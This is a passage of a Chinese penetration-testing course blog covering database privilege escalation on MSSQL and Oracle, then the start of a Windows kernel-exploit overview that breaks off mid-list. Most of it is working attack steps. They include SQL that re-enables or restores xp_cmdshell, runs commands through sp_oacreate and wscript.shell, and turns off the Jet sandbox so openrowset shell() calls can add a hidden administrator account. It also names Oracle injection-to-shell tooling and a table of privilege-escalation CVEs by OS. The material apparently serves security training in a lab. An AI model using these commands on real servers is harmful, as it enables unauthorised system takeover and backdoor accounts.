src="/../images/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/image-20230419140938173.png" alt="image-20230419140938173"></p><p>xp_cmdshell默认在mssql2000中是开启的，在mssql2005之后的版本中则默认禁止。如果用户拥有管理员sa权限则可以用sp_configure重修开启它。</p><h5 id="启用："><a href="#启用：" class="headerlink" title="启用："></a>启用：</h5><ul><li>EXEC sp_configure ‘show advanced options’, 1</li><li>RECONFIGURE;</li><li>EXEC sp_configure ‘xp_cmdshell’, 1;</li><li>RECONFIGURE;</li></ul><h5 id="关闭："><a href="#关闭：" class="headerlink" title="关闭："></a>关闭：</h5><ul><li>exec sp_configure ‘show advanced options’, 1;</li><li>reconfigure;</li><li>exec sp_configure ‘xp_cmdshell’, 0;</li><li>reconfigure;</li></ul><h5 id="执行："><a href="#执行：" class="headerlink" title="执行："></a>执行：</h5><ul><li>EXEC master.dbo.xp_cmdshell ‘命令’</li><li>如果xp_cmdshell被删除了，可以上传xplog70.dll进行恢复</li><li>exec master.sys.sp_addextendedproc ‘xp_cmdshell’, ‘C:\Program Files\Microsoft SQL Server\MSSQL\Binn\xplog70.dll’</li></ul><h6 id="同样在配置文件中查看数据库的账号密码"><a href="#同样在配置文件中查看数据库的账号密码" class="headerlink" title="同样在配置文件中查看数据库的账号密码"></a>同样在配置文件中查看数据库的账号密码</h6><p><img src="/../images/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/image-20230419141152054.png" alt="image-20230419141152054"></p><h6 id="Navicat连接数据库"><a href="#Navicat连接数据库" class="headerlink" title="Navicat连接数据库"></a>Navicat连接数据库</h6><p><img src="/../images/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/image-20230419141434996.png" alt="image-20230419141434996"></p><h6 id="执行命令-EXEC-master-dbo-xp-cmdshell-‘命令’"><a href="#执行命令-EXEC-master-dbo-xp-cmdshell-‘命令’" class="headerlink" title="执行命令 EXEC master.dbo.xp_cmdshell ‘命令’"></a>执行命令 EXEC master.dbo.xp_cmdshell ‘命令’</h6><p><img src="/../images/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/image-20230419141347982.png" alt="image-20230419141347982"></p><h6 id="倘若执行命令将xp-cmshell设置为0关闭"><a href="#倘若执行命令将xp-cmshell设置为0关闭" class="headerlink" title="倘若执行命令将xp_cmshell设置为0关闭"></a>倘若执行命令将xp_cmshell设置为0关闭</h6><p><img src="/../images/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/image-20230419141637395.png" alt="image-20230419141637395"></p><h6 id="再次执行系统命令时，将不能成功"><a href="#再次执行系统命令时，将不能成功" class="headerlink" title="再次执行系统命令时，将不能成功"></a>再次执行系统命令时，将不能成功</h6><p><img src="/../images/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/image-20230419141719603.png" alt="image-20230419141719603"></p><h6 id="如果xp-cmdshell关闭了，可以用命令启动，即使如果删除了xp-cmdshell，可以按开头的命令进行恢复"><a href="#如果xp-cmdshell关闭了，可以用命令启动，即使如果删除了xp-cmdshell，可以按开头的命令进行恢复" class="headerlink" title="如果xp_cmdshell关闭了，可以用命令启动，即使如果删除了xp_cmdshell，可以按开头的命令进行恢复"></a>如果xp_cmdshell关闭了，可以用命令启动，即使如果删除了xp_cmdshell，可以按开头的命令进行恢复</h6><p><img src="/../images/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/image-20230419142230224.png" alt="image-20230419142230224"></p><h6 id="也一样可以用msf直接提权"><a href="#也一样可以用msf直接提权" class="headerlink" title="也一样可以用msf直接提权"></a>也一样可以用msf直接提权</h6><p><img src="/../images/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/image-20230419142827732.png" alt="image-20230419142827732"></p><h5 id="2-使用sp-oacreate进行提权（无回显没有xp-cmdshell方便）"><a href="#2-使用sp-oacreate进行提权（无回显没有xp-cmdshell方便）" class="headerlink" title="2.使用sp_oacreate进行提权（无回显没有xp_cmdshell方便）"></a>2.使用sp_oacreate进行提权（无回显没有xp_cmdshell方便）</h5><p><a href="https://blog.51cto.com/u_11797152/2411770">SQL Server提权方法汇总（MSSQL）_Margin的技术博客_51CTO博客</a></p><p>主要是用来调用OLE对象，利用OLE对象的run方法执行系统命令。</p><h5 id="启用：-1"><a href="#启用：-1" class="headerlink" title="启用："></a>启用：</h5><ul><li>EXEC sp_configure ‘show advanced options’, 1;   </li><li>RECONFIGURE WITH OVERRIDE;   </li><li>EXEC sp_configure ‘Ole Automation Procedures’, 1;   </li><li>RECONFIGURE WITH OVERRIDE;</li></ul><h5 id="关闭：-1"><a href="#关闭：-1" class="headerlink" title="关闭："></a>关闭：</h5><ul><li>EXEC sp_configure ‘show advanced options’, 1;</li><li>RECONFIGURE WITH OVERRIDE;   </li><li>EXEC sp_configure ‘Ole Automation Procedures’, 0;   </li><li>RECONFIGURE WITH OVERRIDE;</li></ul><h5 id="执行：-1"><a href="#执行：-1" class="headerlink" title="执行："></a>执行：</h5><ul><li>declare @shell int exec sp_oacreate ‘wscript.shell’,@shell output exec sp_oamethod @shell,’run’,null,’c:\windows\system32\cmd.exe &#x2F;c whoami &gt;c:\1.txt’</li></ul><h6 id="如果xp-cmdshell关闭了，可以尝试sp-oacreate，同样有执行命令的功能，下面将whoami执行命令的结果写入1-txt"><a href="#如果xp-cmdshell关闭了，可以尝试sp-oacreate，同样有执行命令的功能，下面将whoami执行命令的结果写入1-txt" class="headerlink" title="如果xp_cmdshell关闭了，可以尝试sp_oacreate，同样有执行命令的功能，下面将whoami执行命令的结果写入1.txt"></a>如果xp_cmdshell关闭了，可以尝试sp_oacreate，同样有执行命令的功能，下面将whoami执行命令的结果写入1.txt</h6><p><img src="/../images/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/image-20230419141900427.png" alt="image-20230419141900427"></p><h6 id="发现成功写入"><a href="#发现成功写入" class="headerlink" title="发现成功写入"></a>发现成功写入</h6><p><img src="/../images/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/image-20230419142108527.png" alt="image-20230419142108527"></p><h6 id="权限为system"><a href="#权限为system" class="headerlink" title="权限为system"></a>权限为system</h6><p><img src="/../images/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/image-20230419142146963.png" alt="image-20230419142146963"></p><h6 id="同样如果关闭了sp-oacreate"><a href="#同样如果关闭了sp-oacreate" class="headerlink" title="同样如果关闭了sp_oacreate"></a>同样如果关闭了sp_oacreate</h6><p><img src="/../images/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/image-20230419142338933.png" alt="image-20230419142338933"></p><h6 id="会无法执行命令"><a href="#会无法执行命令" class="headerlink" title="会无法执行命令"></a>会无法执行命令</h6><p><img src="/../images/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/image-20230419142432904.png" alt="image-20230419142432904"></p><h6 id="如果sp-oacreate关闭了，也可以用命令启动"><a href="#如果sp-oacreate关闭了，也可以用命令启动" class="headerlink" title="如果sp_oacreate关闭了，也可以用命令启动"></a>如果sp_oacreate关闭了，也可以用命令启动</h6><p><img src="/../images/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/image-20230419142504336.png" alt="image-20230419142504336"></p><h5 id="3-使用SQL-Server-沙盒提权（如果前面两个行不通）"><a href="#3-使用SQL-Server-沙盒提权（如果前面两个行不通）" class="headerlink" title="3.使用SQL Server 沙盒提权（如果前面两个行不通）"></a>3.使用SQL Server 沙盒提权（如果前面两个行不通）</h5><p><a href="https://blog.51cto.com/u_11797152/2411770">SQL Server提权方法汇总（MSSQL）_Margin的技术博客_51CTO博客</a></p><h6 id="按照语句一步步执行即可"><a href="#按照语句一步步执行即可" class="headerlink" title="按照语句一步步执行即可"></a>按照语句一步步执行即可</h6><ul><li><p>–提权语句</p><p>exec sp_configure ‘show advanced options’,1;reconfigure;</p></li><li><p>– 不开启的话在执行xp_regwrite会提示让我们开启，</p><p>exec sp_configure ‘Ad Hoc Distributed Queries’,1;reconfigure;</p></li><li><p>–关闭沙盒模式，如果一次执行全部代码有问题，先执行上面两句代码。</p><p>exec master..xp_regwrite ‘HKEY_LOCAL_MACHINE’,’SOFTWARE\Microsoft\Jet\4.0\Engines’,’SandBoxMode’,’REG_DWORD’,0;</p></li><li><p>–查询是否正常关闭，经过测试发现沙盒模式无论是开，还是关，都不会影响我们执行下面的语句。</p><p>exec master.dbo.xp_regread ‘HKEY_LOCAL_MACHINE’,’SOFTWARE\Microsoft\Jet\4.0\Engines’, ‘SandBoxMode’</p></li><li><p>–执行系统命令</p><p>select * from openrowset(‘microsoft.jet.oledb.4.0’,’;database&#x3D;c:&#x2F;windows&#x2F;system32&#x2F;ias&#x2F;ias.mdb’,’select shell(“net user margin margin &#x2F;add”)’)  （添加用户margin）</p><p>select * from openrowset(‘microsoft.jet.oledb.4.0’,’;database&#x3D;c:&#x2F;windows&#x2F;system32&#x2F;ias&#x2F;ias.mdb’,’select shell(“net localgroup administrators margin &#x2F;add”)’)   (将margin添加到管理员组)</p></li></ul><h5 id="沙盒模式SandBoxMode参数含义（默认是2）"><a href="#沙盒模式SandBoxMode参数含义（默认是2）" class="headerlink" title="沙盒模式SandBoxMode参数含义（默认是2）"></a><code>沙盒模式SandBoxMode参数含义（默认是2）</code></h5><p><code>1-4参数含义</code></p><p><code>1:在任何所有者中禁止启用安全模式</code></p><p><code>2:为仅在允许范围内</code></p><p><code>3:必须在access模式下</code></p><p><code>4:完全开启</code></p><p>openrowset是可以通过OLE DB访问SQL Server数据库，OLE DB是应用程序链接到SQL Server的的驱动程序。</p><p>–恢复配置</p><p>–exec master..xp_regwrite ‘HKEY_LOCAL_MACHINE’,’SOFTWARE\Microsoft\Jet\4.0\Engines’,’SandBoxMode’,’REG_DWORD’,1; </p><p>–exec sp_configure ‘Ad Hoc Distributed Queries’,0;reconfigure; </p><p>–exec sp_configure ‘show advanced options’,0;reconfigure;</p><h3 id="Oracle-普通用户-amp-注入提升模式-amp-DBA模式"><a href="#Oracle-普通用户-amp-注入提升模式-amp-DBA模式" class="headerlink" title="#Oracle-普通用户&amp;注入提升模式&amp;DBA模式"></a>#Oracle-普通用户&amp;注入提升模式&amp;DBA模式</h3><h5 id="Oracle数据库在sqlmap时不能使用–os-shell，无效"><a href="#Oracle数据库在sqlmap时不能使用–os-shell，无效" class="headerlink" title="Oracle数据库在sqlmap时不能使用–os-shell，无效"></a>Oracle数据库在sqlmap时不能使用–os-shell，无效</h5><p>工具：<a href="https://github.com/jas502n/oracleshell">https://github.com/jas502n/oracleshell</a></p><p><a href="http://192.168.46.148:8080/sql.jsp?id=7698">http://192.168.46.148:8080/sql.jsp?id=7698</a></p><h5 id="工具存在以下三种模式"><a href="#工具存在以下三种模式" class="headerlink" title="工具存在以下三种模式"></a>工具存在以下三种模式</h5><h5 id="1、普通用户模式："><a href="#1、普通用户模式：" class="headerlink" title="1、普通用户模式："></a>1、普通用户模式：</h5><p>前提是拥有一个普通的oracle连接账号，不需要DBA权限，可提权至DBA，并以oracle实例运行的权限执行操作系统命令。</p><h5 id="2、DBA用户模式：（自动化工具演示）"><a href="#2、DBA用户模式：（自动化工具演示）" class="headerlink" title="2、DBA用户模式：（自动化工具演示）"></a>2、DBA用户模式：（自动化工具演示）</h5><p>拥有DBA账号密码，可以省去自己手动创建存储过程的繁琐步骤，一键执行测试。</p><h5 id="3、注入提升模式：（Sqlmap测试演示）"><a href="#3、注入提升模式：（Sqlmap测试演示）" class="headerlink" title="3、注入提升模式：（Sqlmap测试演示）"></a>3、注入提升模式：（Sqlmap测试演示）</h5><p>拥有一个oracle注入点，可以通过注入点直接执行系统命令，此种模式没有实现回显</p><h6 id="大部分的jsp语言搭建的获得了shell直接是system权限，除了少数"><a href="#大部分的jsp语言搭建的获得了shell直接是system权限，除了少数" class="headerlink" title="大部分的jsp语言搭建的获得了shell直接是system权限，除了少数"></a>大部分的jsp语言搭建的获得了shell直接是system权限，除了少数</h6><h6 id="这里找到oracle数据库配置文件找到账号密码"><a href="#这里找到oracle数据库配置文件找到账号密码" class="headerlink" title="这里找到oracle数据库配置文件找到账号密码"></a>这里找到oracle数据库配置文件找到账号密码</h6><p><img src="/../images/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/image-20230419150047902.png" alt="image-20230419150047902"></p><h6 id="使用orac提权工具"><a href="#使用orac提权工具" class="headerlink" title="使用orac提权工具"></a>使用orac提权工具</h6><h6 id="一开始显示失败，更换为DBA模式"><a href="#一开始显示失败，更换为DBA模式" class="headerlink" title="一开始显示失败，更换为DBA模式"></a>一开始显示失败，更换为DBA模式</h6><p><img src="/../images/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/image-20230419150645729.png" alt="image-20230419150645729"></p><h6 id="发送payload成功，成功获取syste权限，这里的DBA的模式和注入模式是一样的，都是通过注入来判断的，两方法互通"><a href="#发送payload成功，成功获取syste权限，这里的DBA的模式和注入模式是一样的，都是通过注入来判断的，两方法互通" class="headerlink" title="发送payload成功，成功获取syste权限，这里的DBA的模式和注入模式是一样的，都是通过注入来判断的，两方法互通"></a>发送payload成功，成功获取syste权限，这里的DBA的模式和注入模式是一样的，都是通过注入来判断的，两方法互通</h6><p><img src="/../images/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/image-20230419150520683.png" alt="image-20230419150520683"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Day98 权限提升-WIN全平台&amp;MSF自动化&amp;CS插件化&amp;EXP筛选&amp;溢出漏洞</title>
      <link href="/2023/04/17/Day98-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E5%85%A8%E5%B9%B3%E5%8F%B0-MSF%E8%87%AA%E5%8A%A8%E5%8C%96-CS%E6%8F%92%E4%BB%B6%E5%8C%96-EXP%E7%AD%9B%E9%80%89-%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/"/>
      <url>/2023/04/17/Day98-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E5%85%A8%E5%B9%B3%E5%8F%B0-MSF%E8%87%AA%E5%8A%A8%E5%8C%96-CS%E6%8F%92%E4%BB%B6%E5%8C%96-EXP%E7%AD%9B%E9%80%89-%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<p><img src="/../images/Day98-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E5%85%A8%E5%B9%B3%E5%8F%B0-MSF%E8%87%AA%E5%8A%A8%E5%8C%96-CS%E6%8F%92%E4%BB%B6%E5%8C%96-EXP%E7%AD%9B%E9%80%89-%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/QOqJ2bqvxfp3QsFYzrH87Q.pngw=1280&h=1211.png" alt="img"></p><p><img src="/../images/Day98-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E5%85%A8%E5%B9%B3%E5%8F%B0-MSF%E8%87%AA%E5%8A%A8%E5%8C%96-CS%E6%8F%92%E4%BB%B6%E5%8C%96-EXP%E7%AD%9B%E9%80%89-%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/Ns6y3SHic55PD_wXBDxLQA.png" alt="img"></p><p><img src="/../images/Day98-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E5%85%A8%E5%B9%B3%E5%8F%B0-MSF%E8%87%AA%E5%8A%A8%E5%8C%96-CS%E6%8F%92%E4%BB%B6%E5%8C%96-EXP%E7%AD%9B%E9%80%89-%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/NrK5vZMgsN6aNS0Wzm4Tfw.png" alt="img"></p><h3 id="知识点："><a href="#知识点：" class="headerlink" title="#知识点："></a>#知识点：</h3><p>1、掌握WIN系统溢出漏洞提权用户权限</p><p>2、掌握WIN系统溢出漏洞提权常用命令</p><p>3、掌握WIN系统溢出漏洞提权常见步骤</p><p>4、掌握WIN系统溢出漏洞提权EXP筛选&amp;利用</p><p>5、掌握WIN系统溢出漏洞提权不同环境利用区别</p><h3 id="章节点："><a href="#章节点：" class="headerlink" title="#章节点："></a>#章节点：</h3><p>1、Web权限提升</p><p>2、系统权限提升</p><p>3、域控权限提升</p><h3 id="详细点："><a href="#详细点：" class="headerlink" title="#详细点："></a>#详细点：</h3><h4 id="1、具体有哪些权限需要我们了解掌握的？"><a href="#1、具体有哪些权限需要我们了解掌握的？" class="headerlink" title="1、具体有哪些权限需要我们了解掌握的？"></a>1、具体有哪些权限需要我们了解掌握的？</h4><p>后台权限，网站权限，数据库权限，接口权限，系统权限，域控权限等</p><h4 id="2、以上常见权限获取方法简要归类说明？"><a href="#2、以上常见权限获取方法简要归类说明？" class="headerlink" title="2、以上常见权限获取方法简要归类说明？"></a>2、以上常见权限获取方法简要归类说明？</h4><p>后台权限：SQL注入,数据库备份泄露，默认或弱口令等获取帐号密码进入</p><p>网站权限：后台提升至网站权限，RCE或文件操作类、反序列化等漏洞直达Shell</p><p>数据库权限：SQL注入,数据库备份泄露，默认或弱口令等进入或网站权限获取后转入</p><p>接口权限：SQL注入,数据库备份泄露，源码泄漏，培植不当等或网站权限获取后转入</p><p>系统权限：高危系统漏洞直达或网站权限提升转入、数据库权限提升转入，第三方转入等</p><p>域控权限：高危系统漏洞直达或内网横向渗透转入，域控其他服务安全转入等</p><h4 id="3、以上常见权限获取后能操作的具体事情"><a href="#3、以上常见权限获取后能操作的具体事情" class="headerlink" title="3、以上常见权限获取后能操作的具体事情?"></a>3、以上常见权限获取后能操作的具体事情?</h4><h5 id="后台权限"><a href="#后台权限" class="headerlink" title="后台权限:"></a>后台权限:</h5><p>常规WEB界面文章分类等操作，后台功能可操作类</p><h5 id="网站权限："><a href="#网站权限：" class="headerlink" title="网站权限："></a>网站权限：</h5><p>查看或修改程序源代码，可以进行网站或应用的配置文件读取（接口配置信息，数据库配置信息等），还能收集服务器操作系统相关的信息，为后续系统提权做准备。</p><h5 id="数据库权限："><a href="#数据库权限：" class="headerlink" title="数据库权限："></a>数据库权限：</h5><p>操作数据库的权限，数据库的增删改等，源码或配置文件泄漏，也可能是网站权限(webshell)进行的数据库配置文件读取获得。也可以作为提升系统权限手段。</p><h5 id="接口权限："><a href="#接口权限：" class="headerlink" title="接口权限："></a>接口权限：</h5><p>后台或网站权限后的获取途径：后台（修改配置信息功能点），网站权限（查看的配置文件获取），具体可以操作的事情大家自己想想。</p><h5 id="系统权限：如同在你自己操作自己的电脑一样"><a href="#系统权限：如同在你自己操作自己的电脑一样" class="headerlink" title="系统权限：如同在你自己操作自己的电脑一样"></a>系统权限：如同在你自己操作自己的电脑一样</h5><h5 id="域控权限：如同在你自己操作自己的虚拟机一样"><a href="#域控权限：如同在你自己操作自己的虚拟机一样" class="headerlink" title="域控权限：如同在你自己操作自己的虚拟机一样"></a>域控权限：如同在你自己操作自己的虚拟机一样</h5><blockquote><h3 id="演示案例：（win2008、2012、2016、2019）"><a href="#演示案例：（win2008、2012、2016、2019）" class="headerlink" title="演示案例：（win2008、2012、2016、2019）"></a>演示案例：（win2008、2012、2016、2019）</h3><h4 id="➢-Web-amp-Win2008-人工手动-筛选-amp-下载-amp-利用"><a href="#➢-Web-amp-Win2008-人工手动-筛选-amp-下载-amp-利用" class="headerlink" title="➢ Web&amp;Win2008-人工手动-筛选&amp;下载&amp;利用"></a>➢ Web&amp;Win2008-人工手动-筛选&amp;下载&amp;利用</h4><h4 id="➢-Web-amp-Win2008-CS半自动-反弹-amp-插件-amp-利用"><a href="#➢-Web-amp-Win2008-CS半自动-反弹-amp-插件-amp-利用" class="headerlink" title="➢ Web&amp;Win2008-CS半自动-反弹&amp;插件&amp;利用"></a>➢ Web&amp;Win2008-CS半自动-反弹&amp;插件&amp;利用</h4><h4 id="➢-Web-amp-Win2012-MSF全自动-筛选-amp-探针-amp-利用"><a href="#➢-Web-amp-Win2012-MSF全自动-筛选-amp-探针-amp-利用" class="headerlink" title="➢ Web&amp;Win2012-MSF全自动-筛选&amp;探针&amp;利用"></a>➢ Web&amp;Win2012-MSF全自动-筛选&amp;探针&amp;利用</h4><h4 id="➢-Web-amp-Win2016-amp-2019-Ladon半自动-上传利用"><a href="#➢-Web-amp-Win2016-amp-2019-Ladon半自动-上传利用" class="headerlink" title="➢ Web&amp;Win2016&amp;2019-Ladon半自动-上传利用"></a>➢ Web&amp;Win2016&amp;2019-Ladon半自动-上传利用</h4></blockquote><p><img src="/../images/Day98-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E5%85%A8%E5%B9%B3%E5%8F%B0-MSF%E8%87%AA%E5%8A%A8%E5%8C%96-CS%E6%8F%92%E4%BB%B6%E5%8C%96-EXP%E7%AD%9B%E9%80%89-%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/image-20230418142741143.png" alt="image-20230418142741143"></p><p><img src="/../images/Day98-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E5%85%A8%E5%B9%B3%E5%8F%B0-MSF%E8%87%AA%E5%8A%A8%E5%8C%96-CS%E6%8F%92%E4%BB%B6%E5%8C%96-EXP%E7%AD%9B%E9%80%89-%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/image-20230418144102318.png" alt="image-20230418144102318"></p><p><img src="/../images/Day98-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E5%85%A8%E5%B9%B3%E5%8F%B0-MSF%E8%87%AA%E5%8A%A8%E5%8C%96-CS%E6%8F%92%E4%BB%B6%E5%8C%96-EXP%E7%AD%9B%E9%80%89-%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/image-20230418144050638.png" alt="image-20230418144050638"></p><h3 id="截止2022年前的主流提权漏洞："><a href="#截止2022年前的主流提权漏洞：" class="headerlink" title="#截止2022年前的主流提权漏洞："></a>#截止2022年前的主流提权漏洞：</h3><p>CVE-2021-33739 [Microsoft DWM 核心库特权提升漏洞]（Windows 10、20）</p><p>CVE-2021-1732 [Windows Win32k 提权漏洞] (Windows 10, 2019&#x2F;20H2)</p><p>CVE-2020-0787【Windows后台智能传输服务提权漏洞】（Windows 7&#x2F;8&#x2F;10、2008&#x2F;2012&#x2F;2016&#x2F;2019）</p><p>CVE-2020-0796 [Microsoft 服务器消息块 3.1.1 (SMBv3) 协议处理某些请求的方式中存在一个远程代码执行漏洞，即“Windows SMBv3 客户端&#x2F;服务器远程代码执行漏洞”] (Windows 1903&#x2F;1909 )</p><p>CVE-2019-1458 [当Win32k组件无法正确处理内存中的对象时，Windows中存在一个特权提升漏洞]（Windows 7&#x2F;8&#x2F;10&#x2F;2008&#x2F;2012&#x2F;2016）</p><p>CVE-2019-0803 [Win32k 组件无法正确处理内存中的对象时，Windows 中存在提权漏洞] (Windows 7&#x2F;8&#x2F;10&#x2F;2008&#x2F;2012&#x2F;2016&#x2F;2019)</p><p>CVE-2018-8639 [Win32k 组件无法正确处理内存中的对象时，Windows 中存在提权漏洞] (Windows 7&#x2F;8&#x2F;10&#x2F;2008&#x2F;2012&#x2F;2016)</p><p>CVE-2018-1038 [Windows 内核提权漏洞]（Windows 7 SP1&#x2F;Windows Server 2008 R2 SP1）</p><p>CVE-2018-0743 [Windows Subsystem for Linux Elevation of Privilege Vulnerability]（Windows 10 版本 1703&#x2F;Windows 10 版本 1709&#x2F;Windows Server 版本 1709）</p><p>CVE-2018-8453 [Windows Win32k 组件中的提权漏洞] (&gt;&#x3D; windows 8.1)</p><p>CVE-2018-8440 [Windows ALPC 提权漏洞] (windows 7&#x2F;8.1&#x2F;10&#x2F;2008&#x2F;2012&#x2F;2016)</p><p>MS17-017 　[KB4013081] [GDI 调色板对象本地权限提升]（Windows 7&#x2F;8）</p><p>CVE-2017-8464 　[LNK远程执行代码漏洞]（Windows 10 &#x2F; 8.1 &#x2F; 7&#x2F;2016&#x2F;2010&#x2F;2008）</p><p>CVE-2017-0213 　[Windows COM 提权漏洞] (windows 10&#x2F;8.1&#x2F;7&#x2F;2016&#x2F;2010&#x2F;2008)</p><p>CVE-2018-0833 [SMBv3 空指针取消引用拒绝服务] (Windows 8.1&#x2F;Server 2012 R2)</p><p>CVE-2018-8120 [Win32k 提权漏洞] (Windows 7 SP1&#x2F;2008 SP2,2008 R2 SP1)</p><p>MS17-010 　[KB4013389] [Windows 内核模式驱动程序] (windows 7&#x2F;2008&#x2F;2003&#x2F;XP)</p><p>MS16-135 　[KB3199135] [Windows 内核模式驱动程序] (2016)</p><p>MS16-111 　[KB3186973] [内核 API] (Windows 10 10586 (32&#x2F;64)&#x2F;8.1)</p><p>MS16-098 　[KB3178466] [内核驱动程序] (Win 8.1)</p><p>MS16-075 　[KB3164038] [热土豆] (2003&#x2F;2008&#x2F;7&#x2F;8&#x2F;2012)</p><p>MS16-034 　[KB3143145] [内核驱动程序] (2008&#x2F;7&#x2F;8&#x2F;10&#x2F;2012)</p><p>MS16-032 　[KB3143141] [辅助登录句柄] (2008&#x2F;7&#x2F;8&#x2F;10&#x2F;2012)</p><p>MS16-016 　[KB3136041] [WebDAV] (2008&#x2F;Vista&#x2F;7)</p><p>MS16-014 　[K3134228] [远程代码执行] (2008&#x2F;Vista&#x2F;7)</p><p>MS15-097 　[KB3089656] [远程代码执行] (win8.1&#x2F;2012)</p><p>MS15-076 　[KB3067505] [RPC] (2003&#x2F;2008&#x2F;7&#x2F;8&#x2F;2012)</p><p>MS15-077 　[KB3077657] [ATM] (XP&#x2F;Vista&#x2F;Win7&#x2F;Win8&#x2F;2000&#x2F;2003&#x2F;2008&#x2F;2012)</p><p>MS15-061 　[KB3057839] [内核驱动程序] (2003&#x2F;2008&#x2F;7&#x2F;8&#x2F;2012)</p><p>MS15-051 　[KB3057191] [Windows内核模式驱动程序]（2003&#x2F;2008&#x2F;7&#x2F;8&#x2F;2012）</p><p>MS15-015 　[KB3031432] [内核驱动程序] (Win7&#x2F;8&#x2F;8.1&#x2F;2012&#x2F;RT&#x2F;2012 R2&#x2F;2008 R2)</p><p>MS15-010 　[KB3036220] [内核驱动程序] (2003&#x2F;2008&#x2F;7&#x2F;8)</p><p>MS15-001 　[KB3023266] [内核驱动程序] (2008&#x2F;2012&#x2F;7&#x2F;8)</p><p>MS14-070 　[KB2989935] [内核驱动程序] 